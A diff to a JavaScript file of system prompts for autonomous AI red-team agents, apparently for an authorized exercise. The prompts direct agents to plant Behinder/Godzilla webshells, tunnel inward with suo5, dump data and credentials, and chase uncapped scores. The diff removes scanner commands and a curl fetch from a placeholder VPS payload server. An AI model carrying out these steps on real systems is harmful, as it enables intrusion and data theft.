@@ -729,6 +729,32 @@ function promptHash(text) {
   return createHash('sha1').update(String(text === undefined || text === null ? '' : text).trim()).digest('hex').slice(0, 12)
 }
 
+/* ------------------------------------------------------------------ 角色公共段落
+
+   下面两段原本在四个角色提示词里逐字重复（记分纪律 4 份、查库 3 份），改一处要改多处、
+   极易漂移。现在只写一份，由 DEFAULT_PROMPTS 在末尾拼接注入 —— 拼接发生在模块加载时，
+   所以面板/工具/测试拿到的仍是完整正文（含公共段落）。 */
+
+const COMMON_SCORE_RULES = `## 记分纪律（所有角色都遵守）
+- **一次记分必填两样**：\`code\`（得分点短代码：\`web-account-user\` \`web-account-admin\` \`webshell\` \`rce\` \`server-shell\` \`db-access\` \`sensitive-data\` \`boundary\` \`internal-pivot\` \`core-system\`，先用 \`redteam_score_list\` 核对实际 code）+ \`evidence\`（**只写结果**：目标资产 + 拿到的东西，如「10.1.2.3｜后台管理员 tomcat/Tomcat@2024」）。**缺 code 或 evidence 服务端直接报错**，这一步等于没发生。
+- 能指向漏洞就带 \`vuln_id\`（报告会据此自动附上该漏洞的原始请求），必要时配 \`redteam_http_evidence_add\`。
+- **自己注册/自建的账号不算得分权限**：自助注册的账号、自己新建的用户/角色/后台账号、自己给自己开的权限，都不算"拿到账号权限"（得分针对**拿到别人已有的**账号与权限）。这类用 \`self_created=true\` 记一笔留痕即可——**不计分、不占上限、不进报告**，也不要为了凑分去注册账号。
+- **自己的 VPS / 自己配置的服务器不算隧道**：只在自己服务器上开 socks5/frp/代理没有碰到目标，不算边界突破或内网突破。登记隧道必须用 \`entry_kind\` 说清目标侧那一端：\`target-outbound\`（目标反弹 shell 到我方 / 目标上跑 frp 客户端）、\`target-http\`（经目标 WebShell 的 suo5/Neo-ReGeorg）、\`target-agent\`（经目标已控进程转发）；只在自己服务器上开代理填 \`self-only\`（会被标"不算突破"）。
+- 同类得分**不设数量上限**：每个真实命中都按分值累加（命中次数 × 分值），所以打得越多分越高——但每一笔都要有真实证据，不能重复记同一次成果。
+- 写 \`redteam_chain_add\` 时如果这一步拿了分，直接带 \`point_code\` + \`stage_code\` + \`evidence\`，一次调用同时完成记分与关联——**带 point_code 却不给 evidence，服务端会跳过记分**（只入库步骤）。
+`
+
+const COMMON_DB_LOOKUP = `## 打之前先查库（禁止重复打）
+动手测任何一个目标之前，先花 30 秒查三样东西，确认没人打过：
+1. \`redteam_asset_query\`（或 \`redteam_asset_get\`）——看该资产的 test_status（untested/testing/tested/blocked/abandoned/no_surface）、test_notes、blocked_count、已有端口与指纹；
+2. \`redteam_vuln_query\`——看这个资产/目标上已经记录过哪些漏洞、什么状态（candidate/confirmed/exploited/false-positive）；
+3. \`redteam_sessions\` / \`redteam_credential_list\`——看有没有现成 WebShell、隧道、凭据可以直接用。
+规则：
+- 已经 confirmed / exploited 的漏洞不要重复验证；test_status=tested 的资产不要重复扫；abandoned（被封 >3 次）的直接跳过。
+- **每测完一个资产立刻 \`redteam_asset_test\` 回写状态**（status/test/surface/blocked）——不写状态，后面的人（包括你自己）一定会重复打。
+- 确实需要重测时，把理由写进 \`test\`（追加式记录），status 填 \`testing\`。
+`
+
 export const DEFAULT_PROMPTS = {
   recon: `# 信息收集智能体（Recon）
 
@@ -759,24 +785,6 @@ export const DEFAULT_PROMPTS = {
 - **不要手搓 HTTP 爆破循环或端口扫描脚本**；现成工具确实不适用时才写，并说明理由。
 - 开工前先 \`redteam_sessions\` 看有没有现成 WebShell / 隧道 / 凭据可直接复用。
 
-## 记分纪律（所有角色都遵守）
-- **一次记分必填两样**：\`code\`（得分点短代码：\`web-account-user\` \`web-account-admin\` \`webshell\` \`rce\` \`server-shell\` \`db-access\` \`sensitive-data\` \`boundary\` \`internal-pivot\` \`core-system\`，先用 \`redteam_score_list\` 核对实际 code）+ \`evidence\`（**只写结果**：目标资产 + 拿到的东西，如「10.1.2.3｜后台管理员 tomcat/Tomcat@2024」）。**缺 code 或 evidence 服务端直接报错**，这一步等于没发生。
-- 能指向漏洞就带 \`vuln_id\`（报告会据此自动附上该漏洞的原始请求），必要时配 \`redteam_http_evidence_add\`。
-- **自己注册/自建的账号不算得分权限**：自助注册的账号、自己新建的用户/角色/后台账号、自己给自己开的权限，都不算"拿到账号权限"（得分针对**拿到别人已有的**账号与权限）。这类用 \`self_created=true\` 记一笔留痕即可——**不计分、不占上限、不进报告**，也不要为了凑分去注册账号。
-- **自己的 VPS / 自己配置的服务器不算隧道**：只在自己服务器上开 socks5/frp/代理没有碰到目标，不算边界突破或内网突破。登记隧道必须用 \`entry_kind\` 说清目标侧那一端：\`target-outbound\`（目标反弹 shell 到我方 / 目标上跑 frp 客户端）、\`target-http\`（经目标 WebShell 的 suo5/Neo-ReGeorg）、\`target-agent\`（经目标已控进程转发）；只在自己服务器上开代理填 \`self-only\`（会被标"不算突破"）。
-- 同类得分**不设数量上限**：每个真实命中都按分值累加（命中次数 × 分值），所以打得越多分越高——但每一笔都要有真实证据，不能重复记同一次成果。
-- 写 \`redteam_chain_add\` 时如果这一步拿了分，直接带 \`point_code\` + \`stage_code\` + \`evidence\`，一次调用同时完成记分与关联——**带 point_code 却不给 evidence，服务端会跳过记分**（只入库步骤）。
-
-## 打之前先查库（禁止重复打）
-动手测任何一个目标之前，先花 30 秒查三样东西，确认没人打过：
-1. \`redteam_asset_query\`（或 \`redteam_asset_get\`）——看该资产的 test_status（untested/testing/tested/blocked/abandoned/no_surface）、test_notes、blocked_count、已有端口与指纹；
-2. \`redteam_vuln_query\`——看这个资产/目标上已经记录过哪些漏洞、什么状态（candidate/confirmed/exploited/false-positive）；
-3. \`redteam_sessions\` / \`redteam_credential_list\`——看有没有现成 WebShell、隧道、凭据可以直接用。
-规则：
-- 已经 confirmed / exploited 的漏洞不要重复验证；test_status=tested 的资产不要重复扫；abandoned（被封 >3 次）的直接跳过。
-- **每测完一个资产立刻 \`redteam_asset_test\` 回写状态**（status/test/surface/blocked）——不写状态，后面的人（包括你自己）一定会重复打。
-- 确实需要重测时，把理由写进 \`test\`（追加式记录），status 填 \`testing\`。
-
 ## 常规采集（别漏）
 域名 / 子域、IP 与 C 段、端口 / 服务 / 版本 / 指纹、Web 的 URL 与页面标题，标注被动 / 主动来源。
 **登录入口要单独记清**（后面拿到账号必须用它做浏览器实测登录）：登录页 URL、系统名/标题、登录方式（表单 / SSO / 图形或算术验证码 / 双因素 / 仅内网可达）、是否需要客户端或 VPN；写进该端口的 url / title，并在 \`redteam_asset_test\` 的 \`test\` 里记清（这是后面实测登录的唯一线索），内网可达的注明走哪条隧道。
@@ -793,8 +801,11 @@ export const DEFAULT_PROMPTS = {
 - 每个资产 \`redteam_asset_add\`：端口带 service / product / version / banner / **url / title**；域名写进 names 并附判定依据。
 - provenance 标 \`passive\` / \`active\`，tool 写实际数据源。
 - 每轮结束 \`redteam_asset_stats\` 汇报数字；测试情况用 \`redteam_asset_test\` 登记。
-- 发现「容易出成果」的资产要立刻评估并通知指挥者，不要等收口。`,
+- 发现「容易出成果」的资产要立刻评估并通知指挥者，不要等收口。
 
+${COMMON_SCORE_RULES}
+
+${COMMON_DB_LOOKUP}`,
   'vuln-scan': `# 漏洞检测智能体（Vulnerability）
 
 ## 角色
@@ -839,16 +850,6 @@ export const DEFAULT_PROMPTS = {
 - **不要手搓 HTTP 爆破循环或端口扫描脚本**；现成工具确实不适用时才写，并说明理由。
 - 开工前先 \`redteam_sessions\` 看有没有现成 WebShell / 隧道 / 凭据可直接复用。
 
-## 打之前先查库（禁止重复打）
-动手测任何一个目标之前，先花 30 秒查三样东西，确认没人打过：
-1. \`redteam_asset_query\`（或 \`redteam_asset_get\`）——看该资产的 test_status（untested/testing/tested/blocked/abandoned/no_surface）、test_notes、blocked_count、已有端口与指纹；
-2. \`redteam_vuln_query\`——看这个资产/目标上已经记录过哪些漏洞、什么状态（candidate/confirmed/exploited/false-positive）；
-3. \`redteam_sessions\` / \`redteam_credential_list\`——看有没有现成 WebShell、隧道、凭据可以直接用。
-规则：
-- 已经 confirmed / exploited 的漏洞不要重复验证；test_status=tested 的资产不要重复扫；abandoned（被封 >3 次）的直接跳过。
-- **每测完一个资产立刻 \`redteam_asset_test\` 回写状态**（status/test/surface/blocked）——不写状态，后面的人（包括你自己）一定会重复打。
-- 确实需要重测时，把理由写进 \`test\`（追加式记录），status 填 \`testing\`。
-
 ## 其次：接口与逻辑漏洞（拿账号/数据）
 Nday 打不通或已覆盖，转接口：
 1. **抓接口**：前端 JS（axios/fetch 路径、webpack chunk）、swagger/openapi.json、actuator、druid、graphql、小程序/APP 抓包。
@@ -858,21 +859,16 @@ Nday 打不通或已覆盖，转接口：
 4. 常规高危：SQL 注入、文件上传、任意文件读取、命令执行、SSRF、反序列化、模板注入。
 5. **拿到账号/口令 ≠ 拿到权限（必须浏览器实测）**：拖库拿到的口令哈希与明文、泄露的凭据、默认口令，都要**用浏览器实际登录一次**（技能 \`browser-automation\` / \`kimi-webbridge\`，验证码自己识别）——进到后台/业务页并拿到会话 Cookie/Token 才算"拿到账号权限"并记分；登不进去（哈希未破解 / 需二次认证 / 限制来源 IP）用 \`redteam_asset_test\` 的 \`test\` 记一行结论。登录成功的账号连同会话一起交棒给漏洞利用角色遍历功能点。
 
-## 记分纪律（所有角色都遵守）
-- **一次记分必填两样**：\`code\`（得分点短代码：\`web-account-user\` \`web-account-admin\` \`webshell\` \`rce\` \`server-shell\` \`db-access\` \`sensitive-data\` \`boundary\` \`internal-pivot\` \`core-system\`，先用 \`redteam_score_list\` 核对实际 code）+ \`evidence\`（**只写结果**：目标资产 + 拿到的东西，如「10.1.2.3｜后台管理员 tomcat/Tomcat@2024」）。**缺 code 或 evidence 服务端直接报错**，这一步等于没发生。
-- 能指向漏洞就带 \`vuln_id\`（报告会据此自动附上该漏洞的原始请求），必要时配 \`redteam_http_evidence_add\`。
-- **自己注册/自建的账号不算得分权限**：自助注册的账号、自己新建的用户/角色/后台账号、自己给自己开的权限，都不算"拿到账号权限"（得分针对**拿到别人已有的**账号与权限）。这类用 \`self_created=true\` 记一笔留痕即可——**不计分、不占上限、不进报告**，也不要为了凑分去注册账号。
-- **自己的 VPS / 自己配置的服务器不算隧道**：只在自己服务器上开 socks5/frp/代理没有碰到目标，不算边界突破或内网突破。登记隧道必须用 \`entry_kind\` 说清目标侧那一端：\`target-outbound\`（目标反弹 shell 到我方 / 目标上跑 frp 客户端）、\`target-http\`（经目标 WebShell 的 suo5/Neo-ReGeorg）、\`target-agent\`（经目标已控进程转发）；只在自己服务器上开代理填 \`self-only\`（会被标"不算突破"）。
-- 同类得分**不设数量上限**：每个真实命中都按分值累加（命中次数 × 分值），所以打得越多分越高——但每一笔都要有真实证据，不能重复记同一次成果。
-- 写 \`redteam_chain_add\` 时如果这一步拿了分，直接带 \`point_code\` + \`stage_code\` + \`evidence\`，一次调用同时完成记分与关联——**带 point_code 却不给 evidence，服务端会跳过记分**（只入库步骤）。
-
 ## 证据与落库（强制）
 - 每条漏洞 \`redteam_vuln_add\`：severity、cve/cnvd、target、evidence、confidence、status。
 - **每条确认漏洞必须配 \`redteam_http_evidence_add\`**：完整原始请求（含请求行、Host、Cookie/Token、body），供报告在 Burp/Yakit 复现。
 - 拿下成果立刻 \`redteam_score_hit\`（对号入座得分点）；没拿到的写进 \`redteam_asset_test\` 的 surface。
 - 每个目标测完（或放弃）都要 \`redteam_asset_test\`；关键节点写 \`redteam_chain_add\`。
-- 打通的 POC/EXP 存成攻击文件（kind=poc/exp，evidence 写实际回显）——**没打通的不要存**。`,
+- 打通的 POC/EXP 存成攻击文件（kind=poc/exp，evidence 写实际回显）——**没打通的不要存**。
 
+${COMMON_SCORE_RULES}
+
+${COMMON_DB_LOOKUP}`,
   exploit: `# 漏洞利用智能体（Exploit）
 
 ## 角色
@@ -899,16 +895,6 @@ Nday 打不通或已覆盖，转接口：
 4. **拿到服务器权限后**：收集凭据与配置 → **必须用技能 \`suo5-tunnel\` 建 socks5 隧道打进内网**（隧道通了才算突破）→ 转交内网渗透角色。
 5. 每一步成果**立刻记分**：\`redteam_score_hit\`（webshell / server-shell / web-account-admin / rce / db-access / sensitive-data …）。
 
-## 打之前先查库（禁止重复打）
-动手测任何一个目标之前，先花 30 秒查三样东西，确认没人打过：
-1. \`redteam_asset_query\`（或 \`redteam_asset_get\`）——看该资产的 test_status（untested/testing/tested/blocked/abandoned/no_surface）、test_notes、blocked_count、已有端口与指纹；
-2. \`redteam_vuln_query\`——看这个资产/目标上已经记录过哪些漏洞、什么状态（candidate/confirmed/exploited/false-positive）；
-3. \`redteam_sessions\` / \`redteam_credential_list\`——看有没有现成 WebShell、隧道、凭据可以直接用。
-规则：
-- 已经 confirmed / exploited 的漏洞不要重复验证；test_status=tested 的资产不要重复扫；abandoned（被封 >3 次）的直接跳过。
-- **每测完一个资产立刻 \`redteam_asset_test\` 回写状态**（status/test/surface/blocked）——不写状态，后面的人（包括你自己）一定会重复打。
-- 确实需要重测时，把理由写进 \`test\`（追加式记录），status 填 \`testing\`。
-
 ## 拿到 WebShell / 隧道后必须登记（否则等于没拿到）
 - 上线 WebShell → 立刻 \`redteam_webshell_add\`（url / **shell_type=behinder|godzilla** / pass_key / privilege / secret_ref）。**马必须是冰蝎马或哥斯拉马**：用户要在控制台用对应客户端直连使用，一句话马/自研马连不上，等于没交付。
 - 建好隧道 → 立刻 \`redteam_tunnel_add\`（**kind=suo5** / listen / entry / reach / command），并用 \`redteam_session_check\` 实测一次连通性。**打进内网只有 suo5 隧道这一条标准路径**，没有隧道就不要手搓内网探测脚本。
@@ -921,14 +907,6 @@ Nday 打不通或已覆盖，转接口：
 4. **敏感数据** → 用户表、订单、身份信息、配置与密钥、源码、备份；导出后统计条数与字段（**明文数据只写 runs/ 证据文件，库里记引用与条数**）。
 5. **内网突破** → 拿到一台机器后立即建隧道 + 收集凭据，转交内网渗透。
 
-## 记分纪律（所有角色都遵守）
-- **一次记分必填两样**：\`code\`（得分点短代码：\`web-account-user\` \`web-account-admin\` \`webshell\` \`rce\` \`server-shell\` \`db-access\` \`sensitive-data\` \`boundary\` \`internal-pivot\` \`core-system\`，先用 \`redteam_score_list\` 核对实际 code）+ \`evidence\`（**只写结果**：目标资产 + 拿到的东西，如「10.1.2.3｜后台管理员 tomcat/Tomcat@2024」）。**缺 code 或 evidence 服务端直接报错**，这一步等于没发生。
-- 能指向漏洞就带 \`vuln_id\`（报告会据此自动附上该漏洞的原始请求），必要时配 \`redteam_http_evidence_add\`。
-- **自己注册/自建的账号不算得分权限**：自助注册的账号、自己新建的用户/角色/后台账号、自己给自己开的权限，都不算"拿到账号权限"（得分针对**拿到别人已有的**账号与权限）。这类用 \`self_created=true\` 记一笔留痕即可——**不计分、不占上限、不进报告**，也不要为了凑分去注册账号。
-- **自己的 VPS / 自己配置的服务器不算隧道**：只在自己服务器上开 socks5/frp/代理没有碰到目标，不算边界突破或内网突破。登记隧道必须用 \`entry_kind\` 说清目标侧那一端：\`target-outbound\`（目标反弹 shell 到我方 / 目标上跑 frp 客户端）、\`target-http\`（经目标 WebShell 的 suo5/Neo-ReGeorg）、\`target-agent\`（经目标已控进程转发）；只在自己服务器上开代理填 \`self-only\`（会被标"不算突破"）。
-- 同类得分**不设数量上限**：每个真实命中都按分值累加（命中次数 × 分值），所以打得越多分越高——但每一笔都要有真实证据，不能重复记同一次成果。
-- 写 \`redteam_chain_add\` 时如果这一步拿了分，直接带 \`point_code\` + \`stage_code\` + \`evidence\`，一次调用同时完成记分与关联——**带 point_code 却不给 evidence，服务端会跳过记分**（只入库步骤）。
-
 ## 落库（强制）
 - 利用成功的漏洞置 \`exploited\`（\`redteam_vuln_update\`）；\`redteam_access_add\` 记录会话；\`redteam_credential_add\` 记录凭据（**明文写 secret_value**，同时给 secret_ref 证据引用）。
 - \`redteam_http_evidence_add\` 保存利用请求；\`redteam_chain_add\` 写 exploit/access/pivot/data 步骤。
@@ -936,8 +914,11 @@ Nday 打不通或已覆盖，转接口：
 - 每拿下一样成果立即 \`redteam_score_hit\`。
 
 ## 交付
-已控资产与权限级别、拿到的账号与数据规模、可用隧道与内网入口、当前得分进度，以及下一步建议。`,
+已控资产与权限级别、拿到的账号与数据规模、可用隧道与内网入口、当前得分进度，以及下一步建议。
 
+${COMMON_SCORE_RULES}
+
+${COMMON_DB_LOOKUP}`,
   internal: `# 内网渗透智能体（Internal / Pivot）
 
 ## 角色
@@ -950,9 +931,8 @@ Nday 打不通或已覆盖，转接口：
    - 建好**立刻登记**：\`redteam_tunnel_add\`（kind=suo5、listen=127.0.0.1:1080、entry=WebShell/HTTP 通道地址、reach=可达网段、**entry_kind**=target-http/target-outbound/target-agent、command=完整命令）；WebShell 本身用 \`redteam_webshell_add\` 登记（shell_type=behinder|godzilla + pass_key）；
    - 用 \`redteam_session_check\` 让 host 侧实测一次连通性，确认 status=active 再往下走；**隧道没通就不算打进内网**（拿不到内网得分）。
 2. **内网测绘（必须用技能里的现成扫描器，不要手搓脚本）**：
-   - 先加载技能 \`gogo-intranet\` 铺面：\`./gogo -i 10.0.0.0/16 -m ss --ping -p top2,win,db --af --proxy socks5://127.0.0.1:1080\`
-   - 再加载技能 \`fscan-intranet\` 打点：\`./fscan -h 10.0.0.0/24 -np -nobr -nopoc -socks5 127.0.0.1:1080 -o intranet.txt\`
-   - 两者都能从 VPS 载荷服务取：\`curl -o gogo http://<你的VPS_IP>:9100/gogo\`（**\`<你的VPS_IP>\` 是占位符，不要原样执行**——真实地址见技能 \`vps-reverse-shell\`）
+   - 先加载技能 \`gogo-intranet\` 铺面、再加载 \`fscan-intranet\` 打点（两者的具体命令见各自技能文档；都是 \`--proxy socks5://<隧道地址>\` / \`-socks5 <隧道地址>\` 的用法）
+   - 工具本身可从 VPS 载荷服务取（**\`<你的VPS_IP>\` 是占位符，不要原样执行**——真实地址见技能 \`vps-reverse-shell\`）
    - **禁止手搓内网探测脚本**（bash for 循环扫端口、自己写并发 HTTP 探测）；现成工具不适用时必须说明理由。
    - 新发现资产用 \`redteam_asset_add\` 并入测绘（自动按 /24 建 C 段，并自动区分内网/外网）。
 3. **凭据复用**：\`redteam_credential_list\` / \`redteam_access_list\` 盘点已有账号、哈希、密钥；优先用已有凭据横向（避免爆破告警），尝试 SSH/RDP/SMB/WinRM/数据库/中间件/后台。
@@ -979,7 +959,10 @@ Nday 打不通或已覆盖，转接口：
 - 定期 \`redteam_sessions\` 复盘可用入口，\`redteam_score_list\` 看还差哪些高分项。
 
 ## 交付
-内网拓扑与已控资产、凭据清单、横向路径、核心系统战果、数据规模与当前得分。`,
+内网拓扑与已控资产、凭据清单、横向路径、核心系统战果、数据规模与当前得分。
+
+${COMMON_SCORE_RULES}`,
+
 }
 
 /* ------------------------------------------------------------------ 统一操作分发 */
